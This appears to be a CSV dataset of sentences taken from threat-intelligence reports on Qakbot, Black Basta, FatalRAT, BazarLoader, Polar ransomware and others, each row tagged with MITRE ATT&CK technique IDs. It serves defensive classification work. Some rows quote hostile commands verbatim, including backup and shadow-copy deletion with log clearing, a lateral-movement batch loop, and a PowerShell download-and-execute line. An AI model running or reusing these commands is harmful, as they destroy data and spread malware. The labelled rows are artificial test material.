"Ultimately, this CMD file calls the ""db"" file.",T1059.003
"In both samples, the ""db"" file is not a database, but is the actual Qakbot trojan.",T1059.003
"Following detonation of Qakbot, the malware copied itself to ""$CURRENTUSER\AppData\Roaming\Microsoft\Isoaahffo\djkuuhd.dll,"" as confirmed by the file's hashes shown below, and sets itself to auto run.",T1547.001
"During the initial detonation of 5898, the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660).",T1055
"Further analysis of the registry keys added by the sample were able to be decrypted by leveraging the decryption script found at the link ""https://github.com/drole/qakbot-registry-decrypt"".",T1053.005
"A later review of the logs revealed that the first attempt to contact the C2 ip’s (""61[.]70[.]29[.]53""[Taiwan]).",T1095
"Due to TCP port 2222’s common use as an alternate port for SSH communication, the Malware Analyst recorded a manual SSH connection to the emulated C2 host in order to show the difference between an SSH connection and the connection made by the Malware sample.",T1095
Evidence suggests that the sample does not communicate over SSH and the communication is consistent with HTTP/S traffic.,T1071.001
"An overview of the lab setup and tools can be found in INDEX B. While continuing to run the SSH client on the emulated C2 device, the malware was detonated on the VM, we can see that the same packet following the 3-way handshake no longer contains SSH information but is detected as a Client Hello.",T1071.001
The emulated C2 Server is now running an HTTPS server on TCP port 2222.,"T1095, T1071.001"
"Following observation of the malware samples, we now know that most of the connection attempts to the C2 IP’s are conducted over TCP port 443.",T1095
"Because of the amount of data outbound, this also may indicate some data exfiltration or interaction with the downloaded second stage from the C2.",T1041
"A dynamic analysis of ""Tox5"" shows the malware drops itself in a randomly generated name folder under the ""ProgramData"" directory and adds itself to a scheduled task.",T1053.005
"Task manager was then use to reveal the service running on PID 3488, which was renamed instance of Tox5.",T1057
LATERAL MOVEMENT: SMB AND RDP Brute Ratel allows for lateral movement leveraging RPC to create SMB traffic.,T1570
"Although no direct RPC actions were observed, possibly from lack of logging or the method of RPC use, multiple logs throughout the incident show the transfer of files using SMB.",T1570
"Logging shows actions taken by the attacker that were recorded by RDPClip in the form of clipboard logging, indicating the use of Remote Desktop Protocol.[CI1]",T1021.001
"[SD2] After the connection to the internet and shared domains were severed, automated processes continued to propagate malware.",T1570
"Files commonly observed transferred via SMB include: Black Basta Ransomware ""Client_s.exe"" and ""Client.exe"" Cobalt Strike beacon with the name of ""Ticket-5731.xls"" "".bat"" files designed to disable Cisco AMP / Microsoft Defender Clipboard logging","T1570, T1562.001, T1059.003"
"Showing the Transfer of Cobalt Strike Beacons using RDPClip: The first part of the command is below, with the payload redacted for size and ease of readability.","T1570, T1021.001"
"This occurred immediately following the clipboard transfer of the command ""net stop Cisco AMP"".","T1027, T1562.001"
The second encoded Base64 string was not only base64 but also Gziped for size and obfuscation.,T1027
This shows the decoded and uncompressed data.,T1140
"Leveraging the Cobalt Strike payload decoder from Github user ""0xtornado"" shows that the payloads were sent using the user agent below.",T1140
"A search of Active Directory for users whose passwords never expire, and the last set date while writing to a file for later exfiltration: Stopping Cisco AMP / Disabling Microsoft Defender, these are the same commands as observed in the "".bat"" files: Transfer and use of Ticket-5731.xls","T1562.001, T1059.003"
"Although cob_12.dll was not collected for technical sample, tox5.exe was reviewed: Clipboard logging showing the “uninstall” commands for Windows Defender: Adding an Admin to ESXi environment: Domain Controller detection: Connection attempt to a ""SH/WEB"" domain:",T1562.001
"Command showing the use of ""Bitsadmin"" to transfer the Black Basta Ransomware: Connection from Client by threat actor: DISABLING ANTIVIRUS/MALWARE SOFTWARE USING "".BAT""","T1562.001, T1059.003"
FILES,"T1562.001, T1059.003"
"The two "".bat"" files that were sent throughout the organization were both designed to turn off Antivirus and Antimalware software.","T1562.001, T1059.003"
This could indicate that it was written hastefully in order to get it onto the target environment.,T1059.003
"""cc.bat"" is a simple script designed to stop Cisco AMP.","T1562.001, T1059.003"
"“W.bat”, on the other hand, has some simple but clever obfuscation in place.",T1027
"This uses a mixture of disguising the ASCII as UTF-16 via manipulating the start of the file, as well as obfuscating the data using a simple cypher.",T1027
"For this example, the text editor ""vim” was used to open the file: ""w.bat"" as viewed through the bash command ""cat"":",T1059.003
"After copying and pasting the body of ""w.bat"" into its own text document ""w.txt"", the team was able to run a lengthy ""sed” command against the file to reveal the below: The sed statement used to decode the body of ""w.bat"":",T1140
"From a static malware analysis review, very little was initially able to be obtained from the sample aside from the "".basta"" suffix and a relation to ""Fax."" Static analysis conducted inside of x32dbg, showing a relation to ""FAX"" and the potential use of the directory ""ProgramData"": Upon detonation, running the malware sets itself up as the service ""Fax"" and enables it to start during safe boot.",T1543.003
"The same device also carried out another collection in December 2022, where data was copied from folder <C\:$RECYCLE.BIN\S-XXXXX$XXXH.pdf>, indicating that the user deleted the collected data.",T1070.004
"The group utilizes sideloading with Adobe CEF Helper to establish a persistent foothold in the user's home directory, employing a naming convention with one of the following patterns: AcroRD32XXX AAM UpdatesXXX AcrobatXXX Eset Malware ProtectionXXX ""XXX"" denotes three random letters.",T1574.002
"The group has been observed utilizing Avast’s WSC DLL for sideloading, a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.","T1574.002, T1047"
The group uses DLL sideloading with Adobe CEF Helper and establishes persistence in the RECYCLERS.BIN folder.,T1574.002
"Most notably, TeamTNT was reported to have copied the code used to detect and remove Alibaba Cloud Security from compromised instances from the Kinsing group.",T1518.001
Drop the malicious updater and related files in the %PROGRAMDATA%\Progtmy\0 directory.,T1036.005
Drop a file named ossutilconfig in the %USERPROFILE% directory.,T1036.005
PROGRAMDATA%\Progptp (although we observed some cases where the FatalRAT malware was installed in this directory instead).,T1036.005
Drop and execute the legitimate installer in C:\Program Files\Common Files (see CommonFiles64Folder).,"T1053.005, T1036.005"
Create scheduled tasks to execute the loader and updater components.,T1053.005
"The malware is run by side-loading a malicious DLL, libpng13.dll, which is used by sccs.exe (Browser Support Module), a legitimate executable developed by Xunlei.",T1574.002
The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.,T1055
"Part of the exported functions in the malicious DLL that are forwarded to the original The malware updater is executed in a similar manner, by side-loading dr.dll, used by a legitimate, signed binary developed by Tencent.","T1574.002, T1036.005"
The malicious DLL is very simple and executes OSSUTIL (included in the installer package as ssu.exe) to download files from an attacker-controlled bucket in Alibaba Cloud.,"T1105, T1059.003"
"The attackers made the same mistake with the scheduled tasks created for the updater, as the execution path also refers to a subdirectory 2 that doesn’t exist.",T1053.005
"In most cases, four scheduled tasks are created: two for the RAT (one set to execute periodically and the other whenever any user logs into the PC) and two for the updater.",T1053.005
The attackers have obfuscated the loader with many calls to a function that just prints some hardcoded values.,T1027
Part of the decompiled code for libpng13.dll on the left and on the right the same code deobfuscated Micr.jpg is actually shellcode that also contains an embedded DLL.,T1027
The purpose of this shellcode is to load and execute in memory the embedded DLL by calling an export function of the DLL named SignalChromeElf.,T1027
"Before the execution of this export function, the shellcode reconstructs the imports table of the DLL and calls the DllEntryPoint, which simply invokes the Windows API function DisableThreadLibraryCalls as a way to increase the stealthiness of the DLL. SignalChromeElf essentially will decrypt, load, and execute an encrypted payload located in the embedded DLL.","T1027, T1106, T1140"
"This encrypted payload is the FatalRAT malware, and after its decryption the DLL will find the address of an export function called SVP7, which contains the entry point of the malware, and call it, passing the encrypted configuration of FatalRAT as an argument.",T1027
The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.,T1140
"As an example, the malware can: Capture keystrokes Change the victim’s screen resolution Terminate browser processes and steal or delete their stored data.",T1056.001
"A comparison of them is shown in Figure 11, and Figure 10 shows the decompiled code used to decrypt strings in the FatalRAT samples from this campaign, which is the same as the one described by AT&T. Figure 10.",T1027
Decompiled code of a function used by a FatalRAT sample to decrypt its configuration strings Figure 11.,"T1027, T1140"
"Unlike the installers that we described previously, this version contains an XOR-encrypted payload, divided into three files: Micr.flv, Micr2.flv, and Micr3.flv, each file encrypted with a different, single byte XOR key.",T1027
"Once decrypted, the content of the three files is concatenated, forming shellcode that contacts a C&C server to download and execute further shellcode.",T1105
"The loader DLL in this case is named dr.dll – the same name that is used for the update mechanism in later versions of the installer, side-loaded by the same legitimate executable.",T1574.002
"Although some of those installers are the same as ones in this report, it seems that most of them are different, compiled as EXE files (not MSI installers) and using a variety of software packers.",T1027
Execution: Malicious FileThe attackers have relied on their victims to execute the malicious MSI installers.,T1204.002
Windows Command ShellThe malware updater uses cmd.exe to download files from Alibaba Cloud Object Storage Service.,T1059.003
APIThe loaders use API calls such as VirtualAlloc to load and execute malicious components into memory.,T1106
PersistenceT1053.005Scheduled Task/Job: Scheduled TaskThe MSI installers create scheduled tasks to achieve persistence.,T1053.005
T1547.001Boot or Logon Autostart Execution: Registry Run Keys / Startup FolderFatalRAT creates a registry Run key to achieve persistence.,T1547.001
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe loaders and FatalRAT component use various encryption algorithms to hide payloads and strings.,T1027
Dynamic API ResolutionThe loaders use dynamic API resolution to avoid detection.,T1027
T1574.002Hijack Execution Flow: DLL Side-LoadingThe attackers have used DLL side-loading to execute their malicious payloads.,T1574.002
Embedded PayloadsThe Micr.jpg file contains shellcode and an embedded DLL file that loads FatalRAT.,T1027
CollectionT1056.001Input Capture: KeyloggingFatalRAT has keylogger functionalities.,T1056.001
Symmetric CryptographyFatalRAT encrypts data with a custom encryption algorithm before it is sent to the C&C server.,T1573.001
T1095Non-Application Layer ProtocolFatalRAT uses TCP for C&C communications.,T1095
ExfiltrationT1020Automated ExfiltrationFatalRAT automatically sends information from a compromised machine to its C&C. T1041Exfiltration Over C2 ChannelFatalRAT exfiltrates data over the same channel used for C&C. 16 Feb 2023 - 11:30AM,T1041
"In the examples we received, one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf.",T1027
"Both of these files were the same three minute long MP3 audio recording – a file that sounds like someone playing an Oud, the stringed instrument similar to a lute used widely in the middle east.",T1027
"When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn’t the type of file it appears to be.",T1027
Adobe Reader or a photo viewing program can’t open the file.,T1204.002
"The target would then, naturally, double click the other file in the Zip archive — a Windows Shortcut (.LNK file) labeled with a PDF file suffix and with an icon that makes it appear to be a PDF document.",T1204.002
"C:\Windows\Tasks\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.",T1105
We found 29 different varieties of the VBS and 90 other encrypted and unencrypted payloads hosted in these locations.,T1027
There may be others.,T1027
A heavily obfuscated VBS,T1027
"The initial infector is a Visual Basic script, heavily obfuscated, and very large at more than 200KB in size.",T1027
"A block of base64-encoded, encrypted data comprises almost 150KB of that script, along with code that decodes and decrypts the block of base64.","T1027, T1140"
These work in tandem to insert data into the Windows Registry and execute PowerShell commands.,"T1140, T1112"
"When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes.",T1140
The PowerShell script decoded from the Ir8 variable uses Reflection.,T1140
Assembly to load the final payload into memory from a Registry value without writing it to disk.,"T1140, T1112"
"The script (shown in part, below) converts several small strings to bytes, concatenates the output, performs a BXOR to decode the bytes, and then converts those bytes to ASCII text, before executing them.",T1140
"The concatenated segments of base64 data from O7 get inserted into the Registry, for the Ir8 script to decode.","T1027, T1140, T1112"
"On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe, used by the now defunct Internet Explorer browser for tuning the microphone settings in the browser.",T1055
"It creates a User-level Environment Variable (in our test case, this was called SaltoQ), which points at the full path to the PowerShell executable on the system.",T1547.001
It created a Run key in the Registry named Overproduce that invokes the SaltoQ variable to run a PowerShell command at every reboot.,T1547.001
"And that Run key references a different Registry key, in HKEY_CURRENT_USER\Cloglike that contains a portion of the same Visual Basic Script code that was in the original .vbs payload the malware downloads during the infection process.",T1547.001
"The executable Review_Report15-10.exe (3c27fca6d9cf1379eee93e6fea339e61) will appear as a PDF document to users who do not have extensions enabled in Windows, as seen in Figure 3. Figure 3: Stage 1 PDF Icon Lure To help obfuscate its purpose, BazarLoader appears to be bound or obfuscated with legitimate resources from YUVPlayer (A Lightweight YUV player which supports various YUV formats).",T1027
"An example of this can be seen in Figure 4. Figure 4: YUVPlayer Dialog Embedded Resource Once executed, the legitimate application or dialogs will not be shown to the user.",T1027
"Instead, it will call advapi32.CryptHashData using the string s_)q03vcOm95^+Rj3dG_Jx@k0GGwYOIddH_14025b520 as the data to create a hash using the PROV_RSA_FULL Windows cryptographic provider.",T1106
"Once the hash is created, it will create a key using advapi32.CryptDeriveKey.",T1106
It will then obtain a handle to the current process for the purpose of allocating memory with PAGE_EXECUTE_READWRITE permissions.,T1055
The next function is responsible for copying the shellcode from the .data section to the newly allocated memory location.,T1027
"Once the encrypted shellcode has been copied to executable memory, it will then use advapi32.CryptEncrypt to decrypt the shellcode.","T1106, T1140"
"The shellcode will obtain a handle to kernel32.LoadLibraryA, kernel32.GetProcAddress, kernel32.VirtualAlloc, kernel32.VirtualProtect and ntdll.",T1106
"ZwFlushInstructionCache, by enumerating the Process Environment Block (PEB) using the instruction mov rax,qword ptr gs: [60].","T1106, T1057"
This is common with shellcode as it will need to resolve these APIs dynamically to interact with the Windows operating system.,T1027
"Once completed, it will then call kernel32.VirtualALloc to prepare injecting a PE executable for the next stage.","T1106, T1055"
"Section Once the .text section is copied, it will start resolving many different Windows APIs using kernel32.GetProcAddress.",T1027
"When the additional APIs have been resolved, it will then make the .text section it copied earlier executable using kernel32.VirtualProtect, as seen in Figure 9. Figure 9: Make .text Section Executable NOTE:",T1106
"This can be seen in Figure 10. Figure 10: OEP Shellcode/PE Trickery After the previous trickery in the new memory space, it will start creating another PE in memory, but this time the header does start with the MZ magic value.",T1055
"After building the headers, it will copy each PE section one at a time, as seen in Figure 11. Figure 11:",T1055
Figure 12: Calling Stage 2 Shellcode BazarLoader’s stage 2 shellcode will make use of encrypted stack strings for many purposes throughout the rest of its code.,T1027
"To avoid running more than one instance of itself, BazarLoader will create a mutex with a hard-coded UUID, then use kernel32.GetLastError to check for the error ERROR_ALREADY_EXISTS.",T1106
"The call to kernel32.CreateMutexA can be seen in Figure 13. Figure 13: Mutex Creation Interestingly, BazarLoader will check for mutexes twice.",T1106
"Once completed, it will decyrpt its C2 configuration, as seen in Figure 14. Figure 14: BazarLoader Stage 2 Decrypted Downloader Config",T1140
"Once BazarLoader has determined the Armenian language is not being used and another instance of itself is not running, it will make a HTTP HEAD request to hxxps://titlecs[.]com.",T1071.001
The first request will be sent using wininet.,T1106
"HttpSendRequestA, as seen in Figure 15. Figure 15: HTTP HEAD Request",T1106
"BazarLoader will also check if it is connected to the internet by making a request to microsoft[.]com, as seen in Figure 17. Figure 17: BazarLoader Internet Connectivity Check Once completed, it will make a POST request to the second domain in its configuration, as seen in Figure 18. Figure 18: BazarLoader C2 Checkin Once completed, it will make a HTTP GET request in order to obtain the next stage, as seen in Figure 19. Figure 19:","T1078, T1071.001"
"The main difference between the two versions is the malware author(s) now include the string Stupid Defender to mock researchers, the shellcode that was stored in the .data section is now stored in the .rsc section, the functionality to get a pointer to the encrypted shellcode and to decrypt it have been broken out into their own separate functions.","T1027, T1140"
"We suspect the reason behind the malware developer(s) success is their use of techniques such as avoiding the use of threading APIs and faking PE injection, when in reality, it is simply shellcode injection.",T1055
The attackers used NBTScan for network reconnaissance and PsExec for lateral movement.,"T1016, T1569.002"
They obtained credentials for pivoting with Mimikatz.,T1078
"In some cases, we were able to detect memory dumps of the lsass process that had been archived and uploaded.","T1027, T1003.001, T1041"
"Because use of Mimikatz was likely blocked by endpoint security software, the attackers were forced to run bruteforcing offline.",T1110
"Another method was to scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer.",T1210
"On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access.",T1105
"By using the tools already described, the attackers obtained the credentials of a domain administration at headquarters.",T1078
"For the finale, on April 29, 2020, the account of the compromised domain admin was used to push Polar ransomware to computers and run it, encrypting user files and demanding a ransom.","T1105, T1078"
Three files are sent to the victim's computer:,T1105
"GameuxInstallHelper.dll (MD5: 1fd8402275d42e7389f0d28b9537db0f) is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run.",T1036.005
"Hex, if absent) and then simple XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.",T1140
"The result is decoded with Base64, yielding a PE file that is loaded and run in memory with .NET.","T1027, T1140"
The payload and intermediate library are deleted before completion.,T1070.004
Hex is an encrypted copy of the Polar ransomware.,T1027
"This payload call sequence (in which a legitimate application loads a malicious library, which in turn decrypts a third component and passes control to it) is very commonly used to run the PlugX backdoor, which is widely seen among such Asian APT groups as APT10, APT41, TA459, and Bronze Union.",T1140
Let's consider the decrypted and decoded version of the ransomware (MD5: 841980b4ae02a4e6520ab834deee241b) in greater detail.,T1140
/Quiet bcdedit /set {default} recoveryenabled no wmic shadowcopy delete wbadmin delete backup wbadmin delete systemstatebackup -keepversions:0 bcdedit /set {default} bootstatuspolicy ignoreallfailures bcdedit /set {default} recoveryenabled no wevtutil.exe clear-log Application wevtutil.exe clear-log Security wevtutil.exe clear-log System wbadmin delete catalog -quiet wbadmin delete catalog -quiet wbadmin delete systemstatebackup,"T1047, T1059.003"
"It then looks for and stops the following processes: agntsvc.exe agntsvc.exe agntsvc.exe agntsvc.exe dbeng50.exe dbsnmp.exe encsvc.exe excel.exe firefoxconfig.exe infopath.exe isqlplussvc.exe msaccess.exe msftesql.exe mspub.exe mydesktopqos.exe mydesktopservice.exe mysqld-nt.exe mysqld-opt.exe mysqld.exe notepad++.exe notepad.exe ocautoupds.exe ocomm.exe ocssd.exe onenote.exe oracle.exe outlook.exe powerpnt.exe sqbcoreservice.exe sqlagent.exe sqlbrowser.exe sqlservr.exe sqlwriter.exe steam.exe synctime.exe tbirdconfig.exe thebat.exe thebat64.exe thunderbird.exe visio.exe winword.exe wordpad.exe xfssvccon.exe Then the malware gets a list of connected disks and starts recursive traversal of directories, skipping a few of them: C:\Windows C:\Program Files C:\Program Files (x86) C:\ProgramData C:\Python $SysReset $Recycle.","T1083, T1057"
This version is derived by encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.,T1027
Then it sends an HTTP POST request with the name of the victim's computer to a server at hxxp://www.therockbrazil.com.br/assinaturas/logs.php.,T1071.001
"Remember that at the end, the malware deletes the intermediate DLL library and encrypted ransomware, but not the legitimate executable file whose process is used for performing the malicious actions.",T1070.004
"%%i in (c:\programdata\list.txt) do ( net use \\%%i\c$ ""*"" /u:*\administrator copy c:\programdata\vmnat.exe \\%%i\c$\windows\system32\vmnat.exe SCHTASKS /Create /S",T1053.005
"* /tr ""cmd.exe /c start c:\windows\system32\vmnat.exe"" /sc",T1059.003
onstart /RU SYSTEM schtasks /run,T1053.005
"*\administrator /p ""*"" /tn * net use \\%%i\c$ /del net use * /del /Y ) del vmnat.exe del list.txt del work.bat",T1070.004
"%%i in (c:\programdata\list.txt) do ( net use \\%%i\c$ ""*"" /u:*\* if not errorlevel 1 ( del \\%%i\c$\programdata\GameuxInstallHelper.dll del \\%%i\c$\programdata\GDFInstall.exe del \\%%i\c$\programdata\Sysurl.",T1070.004
"Authors: Denis Goydenko and Alexey Vishnyakov, Positive Technologies MITRE TTPs Tactic ID Name Initial Access T1190 Exploit Public-Facing Application T1199 Trusted Relationship Execution T1059 Command and Scripting Interpreter:","T1190, T1059.003"
Windows Command Shell T1053 Scheduled Task/Job: Scheduled Task T1047 Windows Management Instrumentation Persistence T1547 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder T1574 Hijack Execution Flow: DLL Search Order Hijacking T1053 Scheduled Task/Job: Scheduled Task T1078 Valid Accounts: Domain Accounts T1078 Valid Accounts: Default Accounts Privilege Escalation T1068 Exploitation for Privilege Escalation Defense Evasion T1140 Deobfuscate/Decode Files or Information T1070 Indicator Removal on Host: Clear Windows Event Logs T1070 Indicator Removal on Host: File Deletion T1070 Indicator Removal on Host: Timestomp Credential Access T1003 OS Credential Dumping: LSASS Memory Discovery T1087 Account Discovery: Domain Account T1082 System Information Discovery T1049 System Network Connections Discovery Lateral Movement T1210 Exploitation of Remote Services T1570 Lateral Tool Transfer T1021 Remote Services: SMB/Windows Admin Shares Collection T1560 Archive Collected Data: Archive via Utility T1005 Data from Local System T1119 Automated Collection T1039 Data from Network Shared Drive Command and Control T1071 Application Layer Protocol: Web Protocols T1132 Data Encoding: Standard Encoding T1573 Encrypted Channel:,"T1047, T1573.001, T1140, T1570, T1210, T1005, T1078, T1082, T1071.001, T1003.001, T1547.001, T1059.003, T1016, T1068, T1053.005"
Symmetric Cryptography Exfiltration T1020 Automated Exfiltration T1041 Exfiltration Over C2 Channel Impact T1486 Data Encrypted for Impact IOCs ChinaChopper: 2ce60073c09887f9e3a482097294e17d 5bc0d6918e03a92f04b3dfc21b619c7f 73717a2f9bfe19ccdad541bec1fa2b69 82a8470534d74c9c5c0d84071eb0a703 b89e96e2ea8dd6fdb438f7d5b8ecf60c TwoFace: 581c331d41ef5f5df99ae0d16b2cebf0 84816f2e1f321f45c15c80b5cd6b4d37 ff2693903a1049984745e79381e9ed7e SysUpdate: 3c1981991cce3b329902288bb2354728 43a2c2fb8d52dc1835ac18516b13aff1 4b5484e3de5c5a2e60fcee50d04183d6 SysUpdate C&C: 103.59.144[.]183 95.179.189[.]33 NBTScan: f01a9a2d1e31332ed36c1a4d2839f412 SMBTouch: b50fff074764b3a29a00b245e4d0c863 PsExec: aeee996fd3484f28e5cd85fe26b6bdcd Termite: dc92496358b8e67568a35b861ba1804e39e3d36b Dsquery: 3583d7c971de148a1ffb3302d1510ef1 EternalBlue:,"T1041, T1573.001"
"The LNK files make web requests to actor-controlled domains and IP addresses to download additional malicious files such as MSI files containing DLLs or executables, VBScript files containing PowerShell commands, or deceptive PDFs.",T1105
"Unpacked file names referencing tax documents in the malware In some cases, GuLoader was used to execute shellcode and subsequently download Remcos on the target system.","T1027, T1105"
The downloader uses several techniques to evade analysis and detection such as using legitimate file-sharing sites and cloud hosting services for payload storage and delivery as well as encryption and obfuscation of the GuLoader shellcode and payloads.,T1027
"Its feature set expanded over the years to include various surveillance, persistence, and information-stealing capabilities:taking full control of the infected machinerecording keystrokes in real time with offline logging availableaccessing live web cam feeds including microphone recordingdownloading files remotelyremote shutdown and rebootdisabling user inputOver",T1056.001
The flexibility of the installer allows to implement various ideas for obfuscating malicious elements.,T1027
"Samples This analysis is based on the following samples: 8F80426CEC76E7C9573A9C58072399AF carrying a Formbook sample: 05dc8c8d912a58a5dde38859e741b2c098061CCF694005A78FCF0FBC8810D137carrying a Formbook sample: f34bd301f4f4d53e2d069b4842bca672 Inside Like every NSIS-based installer, this executable is an archive that can be unpacked with the help of 7zip.",T1027
"Unfortunately, in the newer releases script extraction is no longer supported.",T1027
"Once we unpack the file, we can see several elements, as well as directories typical for NSIS:",T1027
"Both of them are encrypted, and to find out what they contain we need to analyze the full chain of loading.",T1027
"Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.The function GetTempPathW is used to retrieve the path to the %TEMP% directory, where all the components from the archive were automatically extracted at runtime of the NSIS fileThe name of the next file is concatenated to the the %TEMP% pathMemory is allocated for the file content, and the file is read into this bufferA custom decryption algorithm is being applied on the buffer (the algorithm is different for different samples).","T1106, T1140"
"The buffer turns out to be a next shellcodeFinally, the next shellcode is executed The name of the next file is loaded as a stack-based wide string The hashing function used for import resolving follows the same pattern in both cases, yet the constant used to initialize it (denoted as HASH_INIT) is different across the samples.",T1027
*name) { int next_chunk; int hash; for ( hash = HASH_INIT; ; hash = next_chunk + 33 * hash ) { next_chunk = *name++; if ( !next_chunk ) break; } return hash; } view raw nsis_calc_hash.cpp hosted with :red_heart: by GitHub The algorithm used for the buffer decryption differs across the samples.,"T1027, T1140"
The second shellcode revealed after the unpacking algorithm finished processing Shellcode #2 – functionality This shellcode is used for decrypting and loading the final payload (PE file) from the third of the encrypted files.,"T1027, T1140"
It is unpacked and ran by the previous layer.,T1027
"Also, the key that will be used for the decryption is prepared.",T1140
"As before, they are resolved by their hashes.","T1027, T1140"
Then the functions are used to load and decrypt the payload.,T1140
"If loading the next stage has failed, the installer will restart itself.",T1140
"The decryption function is custom, similar (but not identical) to RC4: void __stdcall decrypt_buf(BYTE *data, BYTE *key, unsigned int size) { BYTE key_stream[512]; int j; char next;",T1140
"Loading PE After the PE is decrypted, the function for its loading is deployed.","T1055, T1140"
The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing (a.k.a. RunPE).,T1055
"The content of the payload is mapped into the new process using low level APIs: NtCreateSection, NtMapViewOfSection.",T1106
"Then, the Entry Point is redirected to the new executable via SetThreadContext, and finally the execution is resumed with NtResumeThread.",T1027
The authors used several common techniques to obfuscate this process.,T1027
"The PE loading function makes a use of the following set: The low-level functions, directly related with performing the injection, are called via raw syscalls retrieved directly from NTDLL.",T1106
"Also in this case, functions has been resolved by their hashes.",T1027
"By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.","T1027, T1106"
"Then, a function defined by its hash is retrieved (using the same hashing algorithm that was used to retrieve imports from normally loaded DLLs): After the pointer to the beginning of the function is fetched, a small disassembling loop is used to find the familiar pattern: moving the ID of the syscall into EAX register.",T1027
"We can also find a second, encrypted component, which carries the payload.",T1027
"$INSTDIR File $INSTDIR\o15bmldpqdxcin.dll File $INSTDIR\emvmcmzr.n System::Call $INSTDIR\o15bmldpqdxcin.dll::Gxkeoxkzs(w$\""$INSTDIR\emvmcmzr.n$\"") DetailPrint label StrCpy $0 9 IntOp $0 $0 + 4 Goto $0 DetailPrint done FunctionEnd In this case, the standard NSIS component (System.dll) is used to call the function exported from the DLL, passing the path to the encrypted component as a parameter.",T1027
"As before, we can see decryption of the next stage with the help of a custom algorithm.",T1140
It contains a very similar function dedicated to decrypting and loading the final payload.,T1140
"Second, we can see a check against blacklisted processes.",T1057
Popular and persistent,T1027
"This packer has been around for many years, and probably will stay with us for some years to come.",T1027
"These tactics include distributing phishing emails containing malicious files, utilizing drive-by downloads, and exploiting vulnerabilities in the remote desktop protocol (RDP).","T1566.001, T1210"
"Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.","T1105, T1204.002"
This enables the document to fetch the .dotm file from the remote server required for further actions.,T1105
"Figure 4 – settings.xml.rels file content Once a successful connection to the remote server is established, a malicious template file is downloaded and executed.",T1105
The downloaded template file contains an obfuscated VBA macro.,T1027
"Figure 5 – De-obfuscated macro content The VBA script incorporates a PowerShell command mentioned below to trigger the retrieval of the final stage payload, which is an executable file named “tinytask.exe” from the remote server.",T1105
"Following the successful download, the script saves the obtained payload in the directory “C:\Users\Public\456trytgre3e45yrthtgr.exe” on the compromised system and proceeds to execute it.",T1059.003
“cmd /c powershell/W 01 curl hxxp://91[.]107[.]210[.]207/tinytask.exe -o C:\Users\Public\456trytgre3e45yrthtgr.exe; C:\Users\Public\456trytgre3e45yrthtgr.exe” The downloaded payload is Lockbit ransomware 2.0.,T1059.003
CLFS and Transaction Files PRIVATELOG and STASHLOG rely on the Common Log File System (CLFS) to hide a second stage payload in registry transaction files.,T1112
"It provides applications with API functions—available in clfsw32.dll—to create, store and read log data.",T1106
"This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions.",T1106
"This is similar in nature to malware which may rely, for example, on the Windows Registry or NTFS Extended Attributes to hide their data, which also provide locations to store and retrieve binary data with the Windows API.","T1106, T1112"
"These allow applications to perform a number of changes on the filesystem or registry, all grouped in a single transaction that can be committed or rolled back.",T1112
"For example, to open a registry key in a transaction, the functions RegCreateKeyTransacted(), RegOpenKeyTransacted(), and RegDeleteKeyTransacted() are available.",T1012
"The CLFS master and container file formats are mostly undocumented; however, previous research is available on GitHub.",T1027
"Malware Obfuscation As with many malware families, most of the strings used by PRIVATELOG and STASHLOG are obfuscated.",T1027
"Yet the technique observed here is uncommon and relies on XOR’ing each byte with a hard-coded byte inline, with no loops.",T1027
"Effectively, each string is therefore encrypted with a unique byte stream.",T1027
"Figure 1: Sample string deobfuscation for ""PrintNotify"" Interestingly, some of the deobfuscated strings from the installer are used for logging error messages and have spelling errors or typos such as: Log index=%d, data border exceed bounday.\n Interal data hash mismatch.\n Log buffer size=%u too small, expect aleast %u bytes.\n Introducing STASHLOG In addition to containing obfuscated strings, the installer’s code is protected using various control flow obfuscation techniques that make static analysis cumbersome.","T1027, T1140"
Figure 2 is a graph overview of the installer’s main() function demonstrating the effects of the control flow obfuscation.,T1027
"Figure 2: Graph view of main() STASHLOG has two different modes of operation: Without any arguments, during which it will prepare the environment With a single argument, which is a file that should be hidden in a CLFS file Preparing the Environment Executed without arguments, the installer prints two values to the console: The GUID returned from the registry value of HKLM\SOFTWARE\Microsoft\Cryptography\MachineGUID A 56-byte value derived from a randomly generated GUID with CoCreateGUID() Figure 3: Sample console output The 56-byte value is a concatenation of the random GUID, its SHA1 hash, and the SHA1 hash of the previous values.","T1564.001, T1012"
"Effectively, when executed with no arguments, the installer generates and prints out encryption keys that the actor uses to pre-encrypt the payload before it is written to disk.",T1027
"Stashing the Payload When launched with an argument, the installer opens and decrypts the contents of the file passed as an argument.",T1140
"The encryption algorithm is HC-128, which is rarely seen used in malware.",T1027
"The expected decrypted file contents have a 40-byte header: struct payloadHeader { DWORD magic; DWORD minWinVer; DWORD maxWinVer; DWORD totalSize; WORD numBlocks; WORD unknown; BYTE sha1sum[20]; } In the analyzed installer, the “magic” value is referred to as a checksum; however, STASHLOG verifies this value matches the hard-coded value 0x00686365.",T1140
